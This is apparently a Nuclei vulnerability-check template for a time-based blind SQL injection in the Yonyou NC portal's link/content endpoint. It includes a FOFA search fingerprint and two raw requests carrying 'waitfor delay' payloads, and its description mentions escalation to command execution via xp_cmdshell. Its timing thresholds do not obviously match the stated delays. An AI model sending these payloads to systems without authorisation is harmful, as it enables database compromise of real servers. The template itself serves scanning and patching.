id: yongyouNC-link_content-sql

info:
  name: 用友NC link/content SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: icon_hash="1085941792"
    用友NC /portal/pt/link/content 接口存在SQL注入漏洞，攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
  reference:
    - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247486602&idx=1&sn=9705aff156a7ae4839d6f8642825247c&chksm=c267b9b9f51030af39831f702bdd19e4070a75da92e0f9e6dcfa00ebae7542ffa02f4c015cb8&token=1628549949&lang=zh_CN#rd
  tags: sql injection



http:
  - raw:
      - |
        GET /portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:2'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1

      - |
        GET /portal/pt/link/content?pageId=login&pk_funnode=1'waitfor+delay+'0:0:4'-- HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and


 




